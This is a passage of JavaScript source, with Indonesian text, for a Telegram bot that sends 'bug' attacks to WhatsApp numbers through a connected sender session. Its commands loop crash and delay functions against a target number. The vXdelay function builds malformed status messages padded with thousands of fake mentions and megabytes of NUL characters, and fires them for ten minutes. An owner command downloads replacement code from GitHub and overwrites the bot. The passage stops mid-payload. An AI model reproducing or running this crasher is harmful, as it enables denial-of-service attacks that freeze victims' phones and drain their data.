        callback_data: "cek_join",
        style: "danger"
      }
    ]);

    return ctx.reply(
`
⚠️ *Akses Di Blokir System!*
Kamu wajib join semua channel terlebih dahulu sebelum menggunakan bot.

📌 *Total channel belum di join:* ${notJoined.length}
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: buttons
        }
      }
    );

  }

  return next();

});

// ================= CHECK JOIN ================= //

bot.action("cek_join", async (ctx) => {

  const notJoined = await getNotJoinedChannels(ctx);

  if (notJoined.length === 0) {

    await ctx.answerCbQuery(
      "✅ Semua channel sudah diikuti!"
    );

    await ctx.editMessageText(
      `
🎉 *Verifikasi Berhasil* ✅
Sekarang kamu sudah bisa menggunakan bot.`,
      {
        parse_mode: "Markdown"
      }
    );

  } else {

    await ctx.answerCbQuery(
      `❌ Masih ada ${notJoined.length} channel belum di-join`,
      {
        show_alert: true
      }
    );

  }

});

const DB_FILE = "./blocked.json";

// ================= LOAD DATA ================= //
let blockedCommands = {};

function loadData() {

  if (fs.existsSync(DB_FILE)) {

    blockedCommands = JSON.parse(
      fs.readFileSync(DB_FILE, "utf8")
    );

  } else {

    blockedCommands = {};

    saveData();

  }

}

function saveData() {

  fs.writeFileSync(
    DB_FILE,
    JSON.stringify(
      blockedCommands,
      null,
      2
    )
  );

}

// load saat bot start
loadData();

// ================= MIDDLEWARE ================= //
const commandGuard = (cmdName) => {
  return async (ctx, next) => {
    // Owner bypass
    if (ctx.from.id === ID_TELEGRAM) return next();

    if (blockedCommands[cmdName]) {
      return ctx.reply(`⚠️ Command /${cmdName} sedang ditutup.`);
    }

    return next();
  };
};

// -------- ( LINK URL SCRIPT ) ------- //
const FotoUtama = "https://files.catbox.moe/d4nj40.png";

//------------------(AWAL OFF MENU)--------------------//
const styles = ["Primary", "Success", "Danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedMainKeyboard() {
    const style = styles[styleIndex];

    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    return [
        [
            { text: "Ⴆυɠ ⵢ Ɱҽɳυ", callback_data: "/bug_menu", style },
            { text: "Öwñêr ⵢ Ɱҽɳυ", callback_data: "/owner_menu", style }
        ],
        [
            { text: "X11 ⵢ ᎠᎬᏉ", url: "t.me/VorteyG", style }, 
            { text: "Ꮥαʅυɾαɳ ⵢ Ιɳϝσɾɱαʂι", url: "t.me/GyzkxCh", style }
        ], 
        [
            { text: "₮håñk'§ ☇ ₮ð", callback_data: "/thanks_to", style }
        ], 
    ];
}

function stopMenuAnimation() {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
}

// ------ ( Menu Utama ) ------ //
bot.start(async (ctx) => {
    const menuMessage = `
<blockquote><b>( メ ) – Äkåðzïk Ìñvï¢†µ§</b>
⎔ Author : @VorteyG
⎔ Version : 1.0 
⎔ Type : Jåvå§¢rïþ†
⎔ Status : Active
</blockquote>
<blockquote>Use it wisely and responsibly, remember karma is real and there's always someone better than you.
</blockquote>
ⵢ Tap button below to continue →`;

    try {
        stopMenuAnimation();

        const sentMsg = await ctx.replyWithPhoto(FotoUtama, {
            caption: menuMessage,
                parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: getAnimatedMainKeyboard()
            }
        });

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    sentMsg.message_id,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);
    } catch (error) {
        console.error("Error saat mengirim menu utama:", error);
    }
});

// ------ ( Callback Menu Utama ) ------ //
bot.action("/start", async (ctx) => {
    const menuMessage = `
<blockquote><b>( メ ) – Äkåðzïk Ìñvï¢†µ§</b>
⎔ Author : @VorteyG
⎔ Version : 1.0 
⎔ Type : Jå̊vå̊§¢rïþ†
⎔ Status : Active
</blockquote>
<blockquote>Use it wisely and responsibly, remember karma is real and there's always someone better than you.
</blockquote>
ⵢ Tap button below to continue →`;

    try {
        stopMenuAnimation();

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: FotoUtama,
                caption: menuMessage,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: getAnimatedMainKeyboard()
                }
            }
        );

        const messageId = ctx.callbackQuery.message.message_id;

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);

        await ctx.answerCbQuery();
    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Owner Menu ) ------ //
bot.action('/owner_menu', async (ctx) => {

    stopMenuAnimation();
const owner_menuMenu = `
<blockquote>⬡═―⊱ [ <b>ᴍᴀɴᴇɢᴇʀ ᴜᴘᴅᴀᴛᴇ</b> ⎭ ⊰―═⬡  
✦ /updates → update script latest</blockquote>
<blockquote>⬡═―⊱ [ <b>ᴍᴀɴᴇɢᴇʀ ᴘᴀɴᴇʟ ʙᴜɢ</b> ⎭ ⊰―═⬡</blockquote>
☬ /clearbug → remove antrian bug
☬ /cekantrian → cek antrian bug
<blockquote>⬡═―⊱ [ <b>ᴍᴀɴᴇᴊᴇʀ ᴘᴇɴɢɪʀɪᴍᴀɴ</b> ⎭ ⊰―═⬡</blockquote>
➥ /setloop → atur jumlah loop
➥ /cekloop → melihat jumlah loop
➥ /setcd → atur cooldown command
<blockquote>⬡═―⊱ [ <b>ᴍᴀɴᴇɢᴇʀ sᴇɴᴅᴇʀ</b> ⎭ ⊰―═⬡</blockquote>
⌬ /connect → connect sender
⌬ /killsession → hapus sender
<blockquote>⬡═―⊱ [ <b>ᴍᴀɴᴇɢᴇʀ ɢʀᴏᴜᴘ</b> ⎭ ⊰―═⬡</blockquote>
◈ /addgrup → akses premium
◈ /delgroup → delete premium
<blockquote>⬡═―⊱ [ <b>ᴍᴀɴᴇɢᴇʀ ᴄᴏᴍᴍᴀɴᴅ</b> ⎭ ⊰―═⬡</blockquote>
⟡ /block ☇ blocked cmd
⟡ /unblock ☇ unblocked cmd
⟡ /listblock ☇ list blocked cmd
`;

    const keyboard = [
        [
            {
                text: "ßå¢k ⵢ Mêñµ",
                callback_data: "/start",
                style: "danger"
            },
        ]
    ];

    try {

        await ctx.editMessageCaption(
            owner_menuMenu,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: keyboard
                }
            }
        );

        await ctx.answerCbQuery();

    } catch (error) {

        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {

            await ctx.answerCbQuery();

        } else {

            console.error(
                "Error di owner_menu:",
                error
            );

            await ctx.answerCbQuery(
                "⚠️ Terjadi kesalahan, coba lagi"
            );

        }

    }

});

// ------ ( Bot Action bug Menu ) ------ //
bot.action('/bug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const bug_menuMenu = `
 ⬡═―—⊱ ⎧ ⚡︎⃟Bug Men︎⃟u ⎭ ⊰―—═⬡
<blockquote>¡ ᴅᴇʟᴀʏ ⵢ ʜᴀʀᴅ ¡</blockquote>
⎧々⎭ /Cyzx ☇ Delay Invis Spam`;

    const keyboard = [
        [
            { text: "ßå¢k ⵢ Mêñµ", callback_data: "/start", style: "Success" },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/thanks_to', async (ctx) => {
    stopMenuAnimation(); 
    const thanks_toMenu = `
<blockquote>⬡═―⊱ [ <b>₮HÄñK§ ₮Ö</b> ⎭ ⊰―—⬡</blockquote>
[ X1 ] ☇ VorteyG
[ X2 ] ☇ Gyzkx
ᴛʜᴀɴᴋs ғᴏʀ ᴀʟʟ ʏᴏᴜʀ sᴜᴘᴘᴏʀᴛ
`;
    const keyboard = [
        [
            { text: "ßå¢k ⵢ Mêñµ", callback_data: "/start", style: "danger" },
        ]
    ];

    try {
        await ctx.editMessageCaption(thanks_toMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ---------- ( COMMAND NO SPAM ) ---------- //
bot.command("Forclozy", premGroupOnly(), cooldown, async (ctx) => {

  if (!isWhatsAppConnected) {
    return ctx.reply(
      "🪧 ☇ Tidak ada sender yang terhubung"
    );
  }

  const q =
    ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply(
      "🪧 ☇ Format: /Forzlozy 628xxx"
    );
  }

  const cleanNumber =
    q.replace(/[^0-9]/g, '');

  const target =
    cleanNumber + "@s.whatsapp.net";

  try {

    // tambahan
    const mentions = [target];

    const contextInfo = {
      mentionedJid: mentions,
      participant: target,
      remoteJid: target
    };

    // function tetap
    for (let i = 0; i < 130; i++) {

      await QQSNPC_V8(
        sock,
        target,
        {
          mentions,
          contextInfo
        }
      );

    } 

    await ctx.telegram.sendMessage(
      ctx.chat.id,
`
✅ Succes Send Bug ( Forclozy ) To ${cleanNumber}
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ",
              url: `https://wa.me/${cleanNumber}`
            }
          ]]
        }
      }
    );

  } catch (err) {

    console.log(err);

    await ctx.telegram.sendMessage(
      ctx.chat.id,
`❌ Failed Send Bug ( Forclozy ) To Target
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            {
              text: "Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ",
              url: `https://wa.me/${cleanNumber}`
            }
          ]]
        }
      }
    );

  }

});
// == End Cmd Bug 1

bot.command( "Cyzx",  premGroupOnly(),  cooldown,  async (ctx) => {

    if (!isWhatsAppConnected) {
      return ctx.reply(
        "🪧 ☇ Tidak ada sender yang terhubung"
      );
    }

    const q =
      ctx.message.text.split(" ")[1];

    if (!q) {

      return ctx.reply(
        "🪧 ☇ Format: /Cyzx 628xxx"
      );

    }

    const target =
      q.replace(/[^0-9]/g, '') +
      "@s.whatsapp.net";

    try {
      
      // function tetap
      for (let i = 0; i < 100; i++) {

        await DelayProtocol(sock, target);
        await sleep(5000);

      }

      // sukses
      await ctx.telegram.sendMessage(
        ctx.chat.id,
`
✅ Succes Send Bug ( Delayp ) To ${q}
`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[
              {
                text:
"Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ",
                url:
`https://wa.me/${q.replace(/[^0-9]/g, '')}`, 
               style: "primary"
              }
            ]]
          }
        }
      );

    } catch (err) {

      console.log(err);

      // gagal
      await ctx.telegram.sendMessage(
        ctx.chat.id,
`
❌ Failed Send Bug ( Delayp ) To Target
`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [[
              {
                text:
"Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ",
                url:
`https://wa.me/${q.replace(/[^0-9]/g, '')}`, 
               style: "danger"
              }
            ]]
          }
        }
      );

    }

  }
);


// ---------- ( ALL COMMAND BUG ) ---------- //
bot.command("SedotKuota", premGroupOnly(), async (ctx) => {
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /SedotKuota 628xxxx", { parse_mode: "HTML" });
  const rawNumber = args[1];
  const target = formatTarget(rawNumber);
  if (!target) return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  const username = ctx.from.username || ctx.from.first_name;
  const added = BuldozerJir(username, rawNumber, Buldozer);
  if (!added) return ctx.reply("❌ Gagal menambah job.");
  await ctx.telegram.sendMessage(ctx.chat.id,
    `✅ (SedotKuota) Bug ${rawNumber} Loop: ${defaultLoop}`,
    { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏt", url: `https://wa.me/${rawNumber}`, style: "primary"}]] } }
  );
});

bot.command("Xswy", premGroupOnly(), async (ctx) => {
  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /Delay 628xxxx", { parse_mode: "HTML" });
  const rawNumber = args[1];
  const target = formatTarget(rawNumber);
  if (!target) return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  const username = ctx.from.username || ctx.from.first_name;
  const added = DelayAndroid(username, rawNumber, SilentWipeStatus);
  if (!added) return ctx.reply("❌ Gagal menambah job.");
  await ctx.telegram.sendMessage(ctx.chat.id,
    `✅ (Delay) Bug ${rawNumber} Loop: ${defaultLoop}`,
    { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "Ç̧HÈ̀Ç̧K ☇ ᎿᎯ̈ᏒᎶᎬ̀Ꮏ", url: `https://wa.me/${rawNumber}`, style: "danger"}]] } }
  );
});

// Command untuk mengatur default loop (misal: /setloop 20)
bot.command("setloop", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("🪧 Format: /setloop 20");
  let newLoop = parseInt(args[1]);
  if (isNaN(newLoop) || newLoop < 1) return ctx.reply("Loop harus angka positif");
  defaultLoop = newLoop;
  ctx.reply(`✅ Loop default diubah menjadi ${defaultLoop}x untuk semua spam berikutnya`);
});

// Command cek loop saat ini
bot.command("cekloop", async (ctx) => {
  ctx.reply(`🎯 Loop default saat ini: **${defaultLoop}** kali\nGunakan /setloop <angka> untuk mengubah`, { parse_mode: "Markdown" });
});

// Command antrian
bot.command("cekantrian", async (ctx) => {
  ctx.reply(getQueueStatus(), { parse_mode: "Markdown" });
});

// Command clear antrian (owner only)
bot.command("clearbug", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) return ctx.reply("❌ Hanya owner");
  const cleared = clearAllJobs();
  ctx.reply(`🧹 Berhasil menghapus ${cleared} antrian.`);
});

let isUpdating = false;

// =================[ UPDATE COMMAND ]================= //

bot.command("updates", async (ctx) => {

  // owner only
  if (ctx.from.id != config.ID_TELEGRAM) {
    return ctx.reply(
      "❌ ☇ Akses hanya untuk pemilik"
    );
  }

  // anti spam
  if (isUpdating) {
    return ctx.reply(
      "⏳ ☇ Update sedang berjalan..."
    );
  }

  isUpdating = true;

  // =================[ CONFIG ]================= //

  const UPDATE_FILE = "main.js";

  // raw github
  const UPDATE_URL =
"https://raw.githubusercontent.com/GyzkxT/AutoUpdateBaseAkaozik/refs/heads/main/main.js";

  // local file
  const UPDATE_PATH =
`./${UPDATE_FILE}`;

  // debug
  console.log(
    "UPDATE URL:",
    UPDATE_URL
  );

  // =================[ START ]================= //

  await ctx.reply(
`
⏳ <b>Auto Update Script...</b>

<blockquote>
Mohon tunggu beberapa saat,
bot sedang mengambil file terbaru.
</blockquote>
`,
    {
      parse_mode: "HTML"
    }
  );

  try {

    // ================= DOWNLOAD ================= //

    await new Promise((resolve, reject) => {

      const file =
        fs.createWriteStream(
          UPDATE_PATH
        );

      https.get(
        UPDATE_URL,
        (response) => {

          // cek status
          if (
            response.statusCode !== 200
          ) {

            return reject(
              new Error(
                `HTTP ${response.statusCode}`
              )
            );

          }

          response.pipe(file);

          file.on(
            "finish",
            () => {

              file.close(
                resolve
              );

            }
          );

        }
      ).on(
        "error",
        (err) => {

          fs.unlink(
            UPDATE_PATH,
            () => {}
          );

          reject(err);

        }
      );

    });

    // ================= SUCCESS ================= //

    await ctx.reply(
`✅ <b>Update berhasil!</b>
♻ Restarting bot...
`,
      {
        parse_mode: "HTML"
      }
    );

    // restart bot
    setTimeout(() => {

      process.exit(0);

    }, 2500);

  } catch (e) {

    console.error(e);

    // ================= FAILED ================= //

    await ctx.reply(
`❌ <b>Gagal update.</b>

<blockquote><code>${String(e.message || e)}</code>
</blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

  } finally {

    isUpdating = false;

  }

});


// ------ ( Awal Of Function Bug) ------ //

async function vXdelay(sock, target){
const startTimestamp = Date.now();
const attackDuration = 10 * 60 * 1000;
while (Date.now() - startTimestamp < attackDuration) {
for (let i = 0; i < 1; i++) {
const fakeMentions = Array.from({ length: 2000 }, (_, idx) => `628${idx + 1}9${idx + 1}@s.whatsapp.net`);
  const stickerPayload = {
    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
    "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
    "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
    "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
    "mimetype": "image/webp",
    "height": 512,
    "width": 512,
    "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
    "fileLength": "37824",
    "mediaKeyTimestamp": "1771680407",
    "isAnimated": false,
    "stickerSentTs": "1771694793768",
    "isAvatar": true,
    "isAiSticker": true,
    "isLottie": false,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAgBAhAAAAC1AEhSI2v/xAAZEQEAAgMAAAAAAAAAAAAAAAABABECAxL/2gAIAQMRAT8AOhiP/9oADAMBAAIAAwAAABDzzzzygA88888s888888s88s88s88s888s8/8QAHREAAgICAwEAAAAAAAAAAAAAAAERITEgQTBRUf/aAAgBAgEBPwDZII4FfC9WNLh//8QAGxEBAQACAwEAAAAAAAAAAAAAAAERIQASMUH/2gAIAQMBAT8A5hBRwg0TbV4y7KPbH//Z",
    contextInfo: {
      mentionedJid: fakeMentions,
      pairedMediaType: "HD_IMAGE_CHILD",
      statusSourceType: "MUSIC_STANDALONE",
      statusAttributions: [
        {
          type: "STATUS_MENTION",
          music: {
            authorName: "X",
            songId: "1137812656623908",
            title: "\u0000".repeat(1500),
            author: "\u0000".repeat(1500),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artworkMediaKey: "1771689153",
            artistAttribution: " x ",
            isExplicit: true
          }
        }
      ]
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMusic: {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            title: "\u0003".repeat(1500),
            author: "\u0003".repeat(1500),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artistAttribution: "https://t.me/null",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "1771689153"
          }
        },
        embeddedAction: true
      }
    ]
  };

  await sock.relayMessage("status@broadcast", {
    stickerMessage: stickerPayload
  },
  {
    statusJidList: [target]
  });

const audioPayload1 = {
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3,
        entryPointConversionSource: "StatusMessage",
      },
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: `#${Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "0")}`,

      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211,
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145,
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153,
        ]),
        directPath:
          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,

        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            () => `62${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
    };

    const firstAudioMsg = generateWAMessageFromContent(
      target,
      {
        ...audioPayload1,
        contextInfo: {
          ...audioPayload1.contextInfo,
          participant: "0@s.whatsapp.net",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", firstAudioMsg.message, {
      messageId: firstAudioMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });

sock.relayMessage("status@broadcast", 
{
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "K+ztV1kPJ/IPdUJnOKRSnd7ph77fEgy71KPmhcFUbpc=",
    "fileLength": "1332709",
    "seconds": 86400,
    "mediaKey": "MALF+tSSTMZufgmOofb86Z7LrumE0497jUjW82fhONI=",
    "caption": "꧁".repeat(50000),
    "height": 9999,
    "width": 99999,
    "fileEncSha256": "EiF137hLTwxdgGdtEJ8XqKmVatX8672vNrmI/vJyaXM=",
    "directPath": "/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1770563783",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAgBAhAAAAC1AEhSI2v/xAAZEQEAAgMAAAAAAAAAAAAAAAABABECAxL/2gAIAQMRAT8AOhiP/9oADAMBAAIAAwAAABDzzzzygA88888s888888s88s88s88s888s8/8QAHREAAgICAwEAAAAAAAAAAAAAAAERITEgQTBRUf/aAAgBAgEBPwDZII4FfC9WNLh//8QAGxEBAQACAwEAAAAAAAAAAAAAAAERIQASMUH/2gAIAQMBAT8A5hBRwg0TbV4y7KPbH//Z",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "VIDEO"
    },
    "streamingSidecar": "NcqOmk1FiSxZ1drVtpZhrx6JIcq6FkrdJZFyBrm3oDb2K4j6qsx16UlVSWSG/eaDEfMh4HcR7Yt99IprZfoOu/r/MvtPtopjpUyz/vjWIwsKhhH/yTo2+2NXxTY3NoWJLB46yQ8LXXGb6aM5D+IlwRZYF5Td2E9PxRHWsyjU580kSok5moVXt1fOCIArItLm3gqpowXyNllSXDc8xBNVkmjznPq23bAzfWsB4HlTxdLJxTr5W7wvNGv/urgz2LdXlyxbLjzGBE+HWVC+sLbIuo0s"
  }
},
{}
);

const audioPayload2 = {
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3,
        entryPointConversionSource: "galaxy_message",
      },
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: `#${Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "0")}`,

      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211,
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
